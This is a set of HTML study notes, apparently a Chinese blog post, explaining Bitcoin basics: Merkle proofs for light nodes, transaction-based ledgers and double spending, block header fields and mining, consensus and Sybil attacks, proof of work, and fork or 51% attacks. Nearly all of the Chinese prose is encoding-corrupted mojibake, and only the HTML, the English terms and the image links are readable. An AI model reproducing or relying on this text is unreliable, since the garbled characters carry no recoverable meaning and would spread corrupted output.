<p>å¦‚å›¾ä¸‹æ–¹æ˜¯æ•°æ®å—ï¼Œä¸Šæ–¹æ˜¯èŠ‚ç‚¹ï¼Œé»˜å…‹å°”æ ‘å’ŒäºŒå‰æ ‘çš„åŒºåˆ«åœ¨äºå‰è€…ä½¿ç”¨å“ˆå¸ŒæŒ‡é’ˆä»£æ›¿æ™®é€šæŒ‡é’ˆï¼Œæ¯”å¦‚ABæ•°æ®å—çš„çˆ¶èŠ‚ç‚¹å°±å­˜æœ‰å…¶äºŒè€…çš„å“ˆå¸Œï¼Œå…¶çˆ¶èŠ‚ç‚¹åŒç†ï¼Œæ‰€ä»¥åªéœ€è¦è®°ä½æ ¹å“ˆå¸Œï¼Œä¾¿å¯ä»¥æ£€æµ‹å‡ºå¯¹æ ‘ä¸­ä»»ä½•éƒ¨ä½çš„ä¿®æ”¹ã€‚</p>

<p>å¯¹äºåŒºå—é“¾æ¥è¯´ï¼Œä¸åŒåŒºå—é€šè¿‡å“ˆå¸ŒæŒ‡é’ˆè¿æ¥ï¼Œæ¯ä¸€ä¸ªåŒºå—åˆ†ä¸ºå—å¤´å’Œå—èº«ï¼Œå—èº«ä¸­å­˜æ”¾äº¤æ˜“åˆ—è¡¨ï¼Œè€Œç”±è¿™ä¸ªåŒºå—åŒ…å«çš„äº¤æ˜“ï¼Œæ‰€ç»„æˆçš„é»˜å…‹å°”æ ‘çš„æ ¹å“ˆå¸Œï¼Œå°±å­˜æ”¾åœ¨å—å¤´ä¸­ã€‚</p>

<p>Merkle treeçš„å…·ä½“ç”¨é€”ï¼š</p>

<p>æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ï¼ŒèŠ‚ç‚¹åˆ†ä¸ºè½»èŠ‚ç‚¹å’Œå…¨èŠ‚ç‚¹ï¼Œè½»èŠ‚ç‚¹åªä¿å­˜å—å¤´ä¿¡æ¯ï¼Œè€Œå…¨èŠ‚ç‚¹ä¿å­˜åŒºå—æ‰€æœ‰å†…å®¹ã€‚å› ä¸ºä¸€ä¸ªåŒºå—æ¯”è¾ƒå¤§ï¼Œå¯¹ç¡¬ä»¶è¦æ±‚ä¼šæ¯”è¾ƒé«˜ï¼Œæ¯”å¦‚åƒæ‰‹æœºé’±åŒ…ï¼Œå°±ä¼šé‡‡ç”¨è½»èŠ‚ç‚¹çš„æ–¹å¼å­˜å‚¨ã€‚</p>

<p>å½“å¯¹ä¸€ä¸ªè½»èŠ‚ç‚¹è¯æ˜æŸæ¡äº¤æ˜“ï¼ˆtxï¼Œ<strong>transaction</strong>ï¼‰æ˜¯å¦è¢«å†™å…¥åŒºå—é“¾æ—¶ï¼Œä¾¿ä¼šç”¨åˆ° Merkle proofã€‚æˆ‘ä»¬æŠŠäº¤æ˜“åˆ°åˆ°æ ¹èŠ‚ç‚¹è¿™ä¸€æ¡è·¯å¾„å«åšMerkle proof ï¼Œå¦‚ä¸‹å›¾ï¼Œå½“è½»èŠ‚ç‚¹ç¡®è®¤é»„è‰²äº¤æ˜“æ˜¯å¦å±å®æ—¶ï¼Œä¼šå‘å…¨èŠ‚ç‚¹è¯·æ±‚éœ€è¦çš„å“ˆå¸Œï¼ˆä¸‹å›¾çº¢è‰²å“ˆå¸Œï¼‰ï¼Œç„¶åè‡ªåº•å‘ä¸Šè¿›è¡Œè®¡ç®—ï¼ŒæŠŠå¾—åˆ°çš„æœ€ç»ˆç»“æœå’Œæ ¹å“ˆå¸Œè¿›è¡Œæ¯”å¯¹ï¼Œè¿›è€Œè¿›è¡Œåˆ¤æ–­ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220611171035.png" alt="image-20220611155011261" /></p>

<p>é‚£è¿™æ ·æ˜¯å¦æ˜¯å®‰å…¨çš„å‘¢ï¼Ÿå¦‚æœå¾…éªŒè¯äº¤æ˜“æ˜¯è™šå‡çš„ï¼Œæ˜¯å¦å¯ä»¥å†ä¼ªé€ ä¸€ä¸ªçº¢è‰²å“ˆå¸Œï¼Œæ¥æ»¡è¶³éªŒè¯çš„éœ€æ±‚ï¼Œæˆ‘ä»¬ä»å“ˆå¸Œçš„ä¸‰ä¸ªæ€§è´¨æ¥çœ‹ï¼Œæ˜¾ç„¶æ˜¯ä¸æˆç«‹çš„ã€‚</p>

<p>Merkel proof å¯ä»¥è¯æ˜ Merkel treeä¸­æ˜¯å¦åŒ…å«æŸä¸ªäº¤æ˜“ï¼Œæ‰€ä»¥è¿™ç§è¯æ˜åˆç§°ä¸º <strong>proof of membership</strong> æˆ– <strong>proof of inclusion</strong>ã€‚ å¯¹äºä¸€ä¸ªè½»èŠ‚ç‚¹æ¥è¯´ï¼ŒéªŒè¯ä¸€ä¸ª Merkel proof çš„æ—¶é—´å¤æ‚åº¦æ˜¯å¤šå°‘å‘¢ï¼Ÿå¦‚æœåº•å±‚ä¸€å…±æœ‰ n ä¸ªäº¤æ˜“ï¼Œåˆ™æ—¶é—´å¤æ‚åº¦ä¸º $\theta(log(n)) $ã€‚</p>

<p>å¦‚ä½•è¯æ˜  Merkel tree ä¸­ä¸åŒ…å«æŸä¸ªäº¤æ˜“å‘¢ï¼Ÿå³ <strong>proof of non- membership</strong>ã€‚å¯ä»¥æŠŠæ•´é¢—æ ‘ä¼ ç»™è½»èŠ‚ç‚¹ï¼Œè½»èŠ‚ç‚¹æ”¶åˆ°åéªŒè¯ä¹¦çš„æ„é€ æ˜¯å¯¹çš„ï¼Œæ¯ä¸€å±‚ç”¨åˆ°çš„å“ˆå¸Œå€¼éƒ½æ˜¯æ­£ç¡®çš„ï¼Œè¯´æ˜æ ‘ä¸­åªæœ‰è¿™äº›å¶èŠ‚ç‚¹ï¼Œå¦‚æœä¸åœ¨è¿™é‡Œé¢ï¼Œåˆ™è¯æ˜proof of non- membershipã€‚è¿™æ ·çš„æ—¶é—´å¤æ‚åº¦ä¸º $\theta (n)$ ã€‚ä¸è¿‡æ¯”ç‰¹å¸ä¸­ä¸éœ€è¦ä¸å­˜åœ¨è¯æ˜ã€‚</p>

<h2 id="æ¯”ç‰¹å¸ä¸­çš„åè®®">æ¯”ç‰¹å¸ä¸­çš„åè®®</h2>

<h3 id="äº¤æ˜“transaction-based-ledger">äº¤æ˜“ï¼ˆtransaction based ledgerï¼‰</h3>

<p>è¯´æ¯”ç‰¹å¸ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä¸­å¿ƒåŒ–çš„æ•°å­—è´§å¸æ˜¯æ€ä¹ˆè¿›è¡Œäº¤æ˜“çš„ã€‚</p>

<p>æ¯”å¦‚å¤®è¡Œå‘è¡Œæ•°å­—è´§å¸ï¼Œå¤®è¡Œç”¨ç§é’¥å¯¹æ•°å­—è´§å¸è¿›è¡Œç­¾åï¼Œäººæ°‘ç¾¤ä¼—ç”¨å¤®è¡Œçš„å…¬é’¥è¿›è¡ŒéªŒè¯ï¼Œä»è€Œå¯¹æ•°å­—è´§å¸çš„çœŸä¼ªè¿›è¡Œåˆ¤æ–­ã€‚</p>

<p>å¦‚æœè¯´æŸäººæœ‰100çš„æ•°å­—è´§å¸ï¼Œä»–å¯ä»¥å¯¹è¿™100çš„æ•°å­—è´§å¸è¿›è¡Œå¤åˆ¶ï¼Œè¿™æ ·ç›¸å½“äºå¯ä»¥æ”¯ä»˜ä¸¤æ¬¡ï¼Œä¹Ÿå°±é€ æˆäº†åŒèŠ±æ”»å‡»ï¼ˆ<strong>double spending attack</strong>ï¼‰ã€‚</p>

<p>è¦æƒ³é¢„é˜²è¿™ç§æ”»å‡»ï¼Œå°±éœ€è¦å¤®è¡Œç»™æ¯ä¸ªæ•°å­—è´§å¸ä¸€ä¸ªç¼–å·ï¼Œå†ç»´æŠ¤ä¸€ä¸ªæ•°æ®åº“ã€‚æ•°æ®åº“ä¸­å­˜æœ‰è´§å¸çš„ç¼–å·åŠå…¶æ‰€å±äººã€‚å½“ä¸€ä¸ªäººæƒ³è¦è¿›è¡Œäº¤æ˜“æ—¶ï¼Œéœ€è¦ä»æ•°æ®åº“ä¸­ç¡®è®¤è´§å¸æ˜¯å¦çœŸå®ä»¥åŠæ˜¯å¦æ‰€å±äºä»–ï¼Œéƒ½æ»¡è¶³åæ•°æ®åº“ä¸­è´§å¸çš„ç¼–å·å°†æŒ‡å‘æ”¶æ¬¾äººã€‚</p>

<p>ä½†æ˜¯è¿™æ ·ï¼Œæ¯æ¬¡äº¤æ˜“å¤ªè¿‡äºä¾èµ–ä¸€ä¸ªä¸­å¿ƒåŒ–çš„æœºæ„ï¼Œè¿™æ—¶å»ä¸­å¿ƒåŒ–çš„æ¯”ç‰¹å¸å‡ºç°äº†ã€‚</p>

<p>æ¯”ç‰¹å¸ï¼ŒåŒæ ·ä¹Ÿéœ€è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p>

<ol>
  <li>è°æœ‰æƒåˆ©å‘è¡Œè´§å¸ï¼Œå‘è¡Œå¤šå°‘ï¼Œä»€ä¹ˆæ—¶å€™å‘è¡Œï¼Ÿ</li>
  <li>äº¤æ˜“å¦‚ä½•éªŒè¯èº«ä»½ï¼Ÿå¦‚ä½•é˜²èŒƒåŒèŠ±æ”»å‡»ï¼Ÿ</li>
</ol>

<p>ç¬¬ä¸€ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯æŒ–çŸ¿ï¼Œè¿™ä¸ªéƒ¨åˆ†åé¢ä¼šè¿›è¡Œå­¦ä¹ ã€‚ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é€šè¿‡ä»¥ä¸‹çš„å…·ä½“ä¾‹å­è¿›è¡Œè§£å†³ï¼š</p>

<p><img src="../../assets/images/image-20220611220508617.png" alt="image-20220611220508617" /></p>

<p>å›¾ä¸­ï¼ŒAå…·æœ‰é“¸å¸æƒï¼Œå‘å¸ƒäº†10ä¸ªæ¯”ç‰¹å¸ï¼Œç¬¬ä¸€ä¸ªåŒºå—å†…çš„äº¤æ˜“ä¹Ÿç§°ä¸ºé“¸å¸äº¤æ˜“ã€‚åŒæ—¶Aè½¬è´¦ç»™B 5ä¸ªæ¯”ç‰¹å¸ C 5ä¸ªæ¯”ç‰¹å¸ï¼ŒAå¯¹è¯¥äº¤æ˜“è¿›è¡Œç­¾åï¼ŒåŒæ—¶è¯¥äº¤æ˜“éœ€è¦è¯´æ˜èŠ±æ‰è¿™10ä¸ªæ¯”ç‰¹å¸çš„æ¥æº â€”&gt; é“¸å¸ä¸­äº§ç”Ÿçš„10ä¸ªå¸ï¼Œä¹‹åä»¥æ­¤ç±»æ¨ã€‚</p>

<p>å¯ä»¥çœ‹åˆ°å›¾ä¸­æœ‰ä¸¤ç±»å“ˆå¸ŒæŒ‡é’ˆï¼ˆä¸ç®—å—å†…çš„äº¤æ˜“ç®­å¤´ï¼‰ï¼Œä¸€ç±»æ˜¯æŒ‡å‘å‰ä¸€ä¸ªåŒºå—ç”¨äºå½¢æˆé“¾ï¼Œç¬¬äºŒç±»æ˜¯è¯´æ˜äº¤æ˜“æ¯”ç‰¹å¸çš„æ¥æºï¼ˆçº¢è‰²â¡ï¸ï¼‰ï¼Œå¯ä»¥é˜²æ­¢åŒèŠ±æ”»å‡»ã€‚</p>

<p>é€šè¿‡ä¸Šè¿°å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“æ¯”ç‰¹å¸é‡‡ç”¨çš„æ˜¯ã€ äº¤æ˜“è¿½æº¯ ã€çš„æ–¹æ³•æ£€éªŒæ˜¯å¦æ»¡è¶³äº¤æ˜“æ¡ä»¶ã€‚</p>

<p>æˆ‘ä»¬ç®¡ã€ è®°å½•è´¦æˆ·æ¨¡å¼ ã€çš„æ–¹æ³•å«åš <strong>account-based ledger</strong>ï¼Œç°å®ä¸–ç•Œä»¥åŠä»¥å¤ªåŠï¼Œä½¿ç”¨çš„å°±æ˜¯è¿™ç§æ¨¡å¼ï¼›ã€ è¿½æº¯äº¤æ˜“æ¨¡å¼ ã€çš„æ–¹æ³•ç§°ä¸º <strong>transaction-based ledger</strong>ã€‚</p>

<p>é‚£ä¹ˆäº¤æ˜“çš„è¿‡ç¨‹ï¼Œåˆ°åº•éœ€è¦å“ªäº›ä¿¡æ¯å‘¢ï¼Ÿ</p>

<ol>
  <li>
    <p>ä»A  â€”&gt; B  çš„è½¬è´¦ä¸­ï¼ŒA éœ€è¦çŸ¥é“  B çš„ä¿¡æ¯ï¼š</p>

    <blockquote>
      <p>A æ¯«æ— ç–‘é—®åªéœ€è¦çŸ¥é“ B çš„åœ°å€å°±å¯ä»¥äº†ï¼Œè¿™ä¸ªåœ°å€ç”± B å…¬å¼€çš„å…¬é’¥è¿›è¡ŒäºŒæ¬¡å“ˆå¸Œå¾—åˆ°ã€‚</p>
    </blockquote>
  </li>
  <li>
    <p>ä»A  â€”&gt; B  çš„è½¬è´¦ä¸­ï¼ŒB éœ€è¦çŸ¥é“ A çš„ä¿¡æ¯ï¼š</p>

    <blockquote>
      <p>B éœ€è¦çŸ¥é“ Açš„å…¬é’¥ï¼Œä¸ä»…æ˜¯Bæ‰€æœ‰èŠ‚ç‚¹éƒ½éœ€è¦çŸ¥é“Açš„å…¬é’¥ç”¨äºéªŒè¯Açš„ç­¾åã€‚</p>
    </blockquote>
  </li>
</ol>

<p>è¿™ä¸ªå…¬é’¥æ€ä¹ˆå¾—åˆ°å‘¢ï¼Ÿåœ¨Aäº¤æ˜“æ—¶ï¼Œä»–éœ€è¦æä¾›å‡ºæ¥ï¼ŒåŒæ—¶è¿˜éœ€è¦æä¾›è´§å¸æ¥æºï¼Œè¿™æ ·ä¼šä¸ä¼šæœ‰å®‰å…¨é—®é¢˜å‘¢ï¼Ÿ</p>

<p>å¦‚æœæœ‰ä¸€ä¸ªBâ€™å†’å……Aï¼Œç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œç­¾åï¼ŒåŒæ—¶åœ¨äº¤æ˜“æ—¶åˆ¶å®šè‡ªå·±çš„å…¬é’¥å’ŒAçš„è´§å¸æ¥æºï¼Œé‚£ä¹ˆè¿™æ ·åœ¨ç­¾åéªŒè¯è‚¯å®šæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†è¿™æ— æ³•ä¼ªé€ Açš„äº¤æ˜“ã€‚å› ä¸ºè¿½æº¯è´§å¸æ¥æºæ—¶ï¼Œä¼šå¾—åˆ°Açš„åœ°å€ï¼ˆAçš„å…¬é’¥å“ˆå¸Œï¼‰ï¼Œåªéœ€æŠŠBæ‰€æä¾›çš„å…¬é’¥è¿›è¡Œå“ˆå¸Œä¹‹åæ¯”å¯¹ï¼Œå³å¯ç¡®è®¤æ˜¯ä¸æ˜¯å­˜åœ¨èº«ä»½ä¼ªé€ ã€‚</p>

<p>åœ¨ä¸Šé¢çš„æ¼”ç¤ºä¸­æ¯ä¸ªåŒºå—éƒ½åªæœ‰ä¸€ä¸ªäº¤æ˜“ï¼Œä½†æ˜¯å®é™…ä¸Šä¸€ä¸ªåŒºå—å­˜åœ¨å¤šä¸ªäº¤æ˜“ï¼Œè¿™äº›äº¤æ˜“ä¹Ÿå°±ç»„ç»‡æˆäº† Merkel treeã€‚</p>

<h3 id="æŒ–çŸ¿æ±‚è§£">æŒ–çŸ¿æ±‚è§£</h3>

<p>æˆ‘ä»¬ä¸€ç›´è¯´æŒ–çŸ¿ï¼Œé‚£æŒ–çŸ¿åˆ°åº•æ˜¯ä»€ä¹ˆï¼ŸæŒ–çŸ¿ç®€å•æ¥è¯´å°±æ˜¯æ ¹æ®ç®—åŠ›ï¼Œä¸æ–­å»å°è¯•æ±‚è§£ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ä¸€ä¸ª <strong>block Header</strong> çš„ç»„æˆï¼š</p>

<ol>
  <li>
    <p>version</p>
  </li>
  <li>
    <p>Hash of previous block header ï¼ˆæŒ‡å‘å‰ä¸€ä¸ªåŒºå—æŒ‡é’ˆï¼‰</p>
  </li>
  <li>
    <p>merkle  root hashï¼ˆé»˜å…‹å°”æ ‘æ ¹å“ˆå¸Œå€¼ï¼‰</p>
  </li>
  <li>
    <p>æ›´æ–°æ—¶é—´</p>
  </li>
  <li>
    <p>targetï¼ˆæŒ–çŸ¿éš¾åº¦ï¼‰</p>
  </li>
  <li>
    <p>nonce ï¼ˆä¸€ä¸ªéšæœºæ•°ï¼‰</p>
  </li>
</ol>

<p>ä»¥ä¸Šçš„å†…å®¹ï¼Œ1-5æ˜¯å›ºå®šçš„ï¼Œå”¯ä¸€å˜åŒ–çš„æ˜¯6ï¼ŒæŠŠä»¥ä¸Šå†…å®¹é¦–ä½è¿æ¥èµ·æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯¹è¯¥å­—ç¬¦ä¸²åšä¸¤æ¬¡SHA-256è¿ç®—ï¼Œå¾—åˆ°256ä½çš„Bï¼ŒæŒ–çŸ¿ï¼Œå°±æ˜¯ä¸æ–­çš„éšæœºå°è¯•nonceï¼Œç›´åˆ°B â‰¤ targetï¼Œé€šä¿—ä¸€ç‚¹å°±æ˜¯Bçš„å‰nä½ä¸º0ã€‚</p>

<p>æŒ–çŸ¿çš„å…·ä½“ç»†èŠ‚å’Œéš¾åº¦è°ƒæ•´ä¼šåœ¨åé¢å­¦ä¹ åˆ°ã€‚</p>

<h3 id="åˆ†å¸ƒå¼å…±è¯†">åˆ†å¸ƒå¼å…±è¯†</h3>

<p>åˆ†å¸ƒå¼å…±è¯†æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯´ç³»ç»Ÿä¸­æœ‰å¾ˆå¤šå°æœºå™¨ï¼Œå…±åŒç»´æŠ¤ä¸€ä¸ªå…¨å±€çš„å“ˆå¸Œè¡¨ï¼Œé‚£ä¹ˆè¿™é‡Œçš„å…±è¯†æŒ‡çš„å°±æ˜¯å“ˆå¸Œè¡¨ä¸­åŒ…å«äº†å“ªäº›é”®å€¼å¯¹ï¼Œå‡å¦‚æœºå™¨ Aä¸­æ’å…¥äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œé‚£ä¹ˆè¦æ±‚å…¶ä»–æœºå™¨ä¹Ÿèƒ½å¤Ÿè¯»å‡ºæ¥ã€‚</p>

<blockquote>
  <p>åˆ†å¸ƒå¼ç³»ç»Ÿæœ‰å¾ˆå¤šç»“è®ºï¼Œè¿™é‡Œä¸å±•å¼€ä»‹ç»ï¼›</p>

  <p>FLP ( ä¸‰ä¸ªä¸“å®¶åå­—çš„ç¼©å†™ )ä¸å¯èƒ½ç»“è®ºï¼šåœ¨ä¸€ä¸ªå¼‚æ­¥çš„ ( asynchronous ) ç³»ç»Ÿé‡Œï¼Œç½‘ç»œæ—¶å»¶æ— ä¸Šé™ï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªæˆå‘˜æ˜¯æœ‰é—®é¢˜çš„ ( faulty ) ï¼Œä¹Ÿä¸å¯èƒ½è¾¾æˆå…±è¯†ã€‚</p>

  <p>CAP Theorem ï¼šä»»ä½•ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼ŒConsistency ( ç³»ç»Ÿä¸€è‡´æ€§ )ã€Availability ( å¯ç”¨æ€§ )ã€Partition tolerance ( å®¹é”™æ€§ ) åªèƒ½æœ€å¤šæ»¡è¶³å…¶ä¸­ä¸¤ä¸ªæ€§è´¨ ã€‚</p>
</blockquote>

<p>é‚£åŒºå—é“¾ä¸­ï¼Œéœ€è¦æ»¡è¶³æ€æ ·çš„å…±è¯†å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯åŒºå—çš„å…±è¯†ï¼Œæ¯ä¸ªå…¨èŠ‚ç‚¹éƒ½åœ¨æœ¬åœ°ç»´æŠ¤äº†ä¸€ä¸ªåŒºå—ï¼Œè¿™ä¸ªåŒºå—åŒ…å«äº†å¤šä¸ªäº¤æ˜“ï¼Œé‚£ä¹ˆå“ªäº›äº¤æ˜“è¢«å†™è¿›åŒºå—ï¼ŒæŒ‰ä»€ä¹ˆé¡ºåºå†™å…¥ï¼Œè¿™éœ€è¦è¾¾åˆ°ä¸€ä¸ªç»Ÿä¸€ã€‚è¿™ä¹ˆå¤šå…¨èŠ‚ç‚¹ï¼Œé‚£ä¹ˆç”±å“ªä¸€ä¸ªè¢«å†™å…¥çœŸæ­£çš„åŒºå—é“¾ï¼Œä½œä¸ºå¤§å®¶æ‰€å…¬è®¤çš„ï¼Œæ‹¥æœ‰è®°è´¦æƒï¼Œè¿™å°±æ˜¯å…±è¯†çš„é—®é¢˜ã€‚</p>

<p>åœ¨å¾ˆå¤šåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œéƒ½é‡‡ç”¨æŠ•ç¥¨çš„æœºåˆ¶ä»¥è¾¾åˆ°æŸä¸ªå…±è¯†ï¼Œä½†è¿™æ‰åŒºå—é“¾ä¸­æ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ</p>

<p>å¦‚æœè¯´è¿™ä¸ªé“¾å¯¹åŠ å…¥çš„æˆå‘˜æœ‰æ‰€è¦æ±‚ï¼Œæ¯”å¦‚è”ç›Ÿé“¾ï¼Œé‚£ä¹ˆåŸºäºæŠ•ç¥¨æ˜¯å¯è¡Œçš„ã€‚é—®é¢˜åœ¨äºåŒºå—é“¾åˆ›å»ºè´¦å·çš„æˆæœ¬å‡ ä¹æ²¡æœ‰ï¼Œåªéœ€è¦æœ¬åœ°äº§ç”Ÿå…¬ç§é’¥å¯¹å³å¯ï¼Œä»»ä½•äººéƒ½å¯ä»¥åŠ å…¥ï¼Œå¦‚æœé»‘å®¢ä¸“é—¨äº§ç”Ÿå¤§é‡çš„å…¬ç§é’¥å¯¹ï¼Œå½“å…¶è¶…è¿‡ç³»ç»Ÿçš„ä¸€åŠæ—¶ï¼Œå°±å¯ä»¥è·å¾—æ”¯é…åœ°ä½ï¼Œä¹Ÿå°±æ˜¯å¥³å·«æ”»å‡»ï¼ˆsybil attack ï¼‰ã€‚</p>

<p>é‚£ä¹ˆåŒºå—é“¾æ˜¯æ€ä¹ˆåšåˆ°å‘¢ï¼ŸåŒºå—é“¾é‡‡ç”¨çš„æ˜¯ POW  ï¼ˆproof of works ï¼‰æœºåˆ¶ï¼Œå…·ä½“è¿ä½œå¦‚ä¸‹ï¼š</p>

<blockquote>
  <p>step1ï¼šå…¨ç½‘å¹¿æ’­æ–°çš„æ•°æ®è®°å½• ï¼Œé€šè¿‡åŸºæœ¬åˆæ³•æ€§éªŒè¯çš„æ•°æ®è¢«æš‚å­˜ã€‚è¿™ç‚¹æ˜¯è¯´ï¼Œæ‰€æœ‰å€™é€‰åŒºå—éƒ½æ˜¯åˆæ³•åŒºå—ï¼Œéæ³•åŒºå—ï¼ˆéæ³•æ„æ€æ˜¯åŒºå—ä¸­åŒ…å«çš„äº¤æ˜“ä¸åˆæ³•ï¼‰æ˜¯ä¸ä¼šä½œä¸ºå€™é€‰åŒºå—çš„ã€‚</p>

  <p>step2ï¼šå…¨ç½‘æ‰§è¡Œå…±è¯†ç®—æ³•ï¼Œå³æ‰¾åˆ°åˆé€‚çš„nonceï¼Œä½¿å¾—H(Block header)â‰¤targetï¼Œä¿—ç§°æŒ–çŸ¿</p>

  <p>step3ï¼šç‡å…ˆæ‰¾åˆ°nonceèŠ‚ç‚¹è·å¾—è®°è´¦æƒï¼Œå…¶æ‰“åŒ…çš„åŒºå—å¯ä¸Šä¼ è‡³åŒºå—é“¾ä¸­</p>

  <p>step4ï¼šå¯¹å¤–å¹¿æ’­æ–°åŒºå—ï¼Œå…¶ä»–èŠ‚ç‚¹éªŒè¯é€šè¿‡åï¼Œå°†å…¶åŠ è‡³ä¸»é“¾ä¸­ã€‚</p>
</blockquote>

<p>é¦–å…ˆç¡®å®šä¸€ç‚¹ï¼Œä¸ºä»€ä¹ˆå¤§å®¶éƒ½æƒ³æ‰“åŒ…åŒºå—ï¼Œäº‰å¤ºæ‰€è°“çš„è®°è´¦æƒå‘¢ï¼ŸæŒ–çŸ¿ï¼Œè‡ªç„¶æ˜¯ä¸ºäº†æŒ–çŸ¿çš„å¥–åŠ±ï¼š</p>

<p>ä¸€ä¸ªè·å¾—åˆæ³•åŒºå—çš„èŠ‚ç‚¹ï¼Œå¯ä»¥åœ¨åŒºå—ä¸­è·å¾—ä¸€ä¸ªé“¸å¸äº¤æ˜“ ï¼Œä¹Ÿå°±æ˜¯å‡ºå—å¥–åŠ±ï¼Œå®é™…ä¸Šè¿™ç§æ–¹å¼ä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªäº§ç”Ÿæ–°æ¯”ç‰¹å¸çš„é€”å¾„ã€‚</p>

<p>æ¯”ç‰¹å¸ç³»ç»Ÿè§„å®šï¼Œèµ·åˆæ¯ä¸ªæ‰“åŒ…æˆåŠŸçš„åŒºå—å¯ä»¥è·å¾—50ä¸ªæ¯”ç‰¹å¸ï¼Œä¹‹åæ¯è¿‡ 21ä¸‡ä¸ªåŒºå—ï¼Œå¥–åŠ±å‡åŠï¼Œé€šè¿‡è®¡ç®—æˆ‘ä»¬çŸ¥é“æ¯”ç‰¹å¸ä¸€å…±æœ‰2100ä¸‡ä¸ªã€‚</p>

<p>åŸæ¥åŒºå—é“¾æ˜¯é€šè¿‡ç®—åŠ›æ¥è¿›è¡ŒæŠ•ç¥¨ï¼Œå¤§å®¶äº‰å¤ºçš„å¹¶ä¸æ˜¯è®°è´¦æƒï¼Œè€Œæ˜¯æŒ–çŸ¿åçš„å¥–åŠ±ï¼Œè®°è´¦åªæ˜¯åœ¨åŒºå—é“¾ä¸­é»˜è®¤å±¥è¡Œçš„ä¹‰åŠ¡ã€‚</p>

<p>ä¸‹é¢æˆ‘ä»¬å†çœ‹çœ‹åœ¨å…±è¯†ä¸­å¯èƒ½å‡ºç°çš„å‡ ç§ç‰¹æ®Šæƒ…å†µã€‚</p>

<p><img src="../../assets/images/image-20220612214104372.png" alt="	" /></p>

<p>ä¸Šå›¾ä¸­ï¼ŒAåœ¨ç¬¬5ä¸ªåŒºå—å‘å¸ƒä¹‹åï¼Œå‘å¸ƒäº†ç¬¬4â€™åŒºå—ï¼Œå¹¶å°è¯•ä¸Šä¼ åˆ°åŒºå—é“¾ä¸­ï¼Œè¿™ç§æƒ…å†µæ˜¯å¦å¯è¡Œï¼Ÿ</p>

<p>é¦–å…ˆï¼ŒåŒºå—é“¾éµå¾ªæœ€é•¿é“¾åŸåˆ™ï¼Œ1-4â€™ è¿™æ¡é“¾è™½ç„¶åˆæ³•ï¼Œä½†ä¸æ˜¯æœ€é•¿çš„ï¼Œå¯¹äºç°åœ¨æ­£å‡†å¤‡æŒ–çŸ¿æ‰“åŒ…çš„å…¶ä»–èŠ‚ç‚¹è€Œè¨€ï¼Œä»–ä»¬çš„çˆ¶å“ˆå¸Œï¼ˆHash of previous block header ï¼‰å·²ç»æŒ‡å‘äº†ç¬¬äº”ä¸ªåŒºå—ï¼Œä¹Ÿå°±å†³å®šäº†ä¹‹åçš„å€™é€‰åŒºå—å¿…ç„¶æ˜¯è¿åœ¨5å·åŒºå—ä¹‹åçš„ã€‚</p>

<p>é‚£ä¹ˆè¿™ç§æ”»å‡» ( åˆ†å‰æ”»å‡» ) æœ‰å¯èƒ½æˆç«‹å—ï¼Ÿå¦‚æœAåœ¨ä¸Šä¼ 4â€™åï¼Œé©¬ä¸Šåˆè®¡ç®—å¥½äº†5â€™åŒºå—ï¼Œç„¶åè®¡ç®—å¥½äº†6â€™åŒºå—ï¼Œä¹‹åAåŒæ—¶ä¸Šä¼ ï¼Œå¦‚æœæ•´ä¸ªåŒºå—é“¾ç½‘ç»œè¿˜æ²¡èƒ½ç®—å¥½ç¬¬å…­ä¸ªåŒºå—ï¼Œä»–ä»¬å°±ä¼šæ”¾å¼ƒè®¡ç®—6å·åŒºå—ï¼Œè½¬è€Œå»è®¡ç®—7â€™ï¼Œè¿™å°±æ˜¯åˆ†å‰æ”»å‡»ï¼Œ4å·å’Œ5å·çš„æ‰€æœ‰åˆæ³•äº¤æ˜“éƒ½è¢«å›æ»šã€‚</p>

<p><img src="../../assets/images/image-20220612215231599.png" alt="image-20220612215231599" /></p>

<p>ç†è®ºä¸Šæ˜¯å¯è¡Œçš„ï¼Œå®é™…ä¸ŠAæ‰€å¯¹æŠ—çš„ç®—åŠ›æ˜¯æ•´ä¸ªåŒºå—é“¾ç½‘ç»œçš„å…¶ä»–æ‰€æœ‰è®¡ç®—æœºï¼Œæ‰€ä»¥åªæœ‰Aè¾¾åˆ°æ•´ä¸ªç³»ç»Ÿçš„ 51% ç®—åŠ›ï¼Œæ‰å¯èƒ½å®ç°ã€‚</p>

<p>è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯è‡ªç„¶åˆ†å‰ï¼š</p>

<p><img src="../../assets/images/image-20220612215845702.png" alt="image-20220612215845702" /></p>

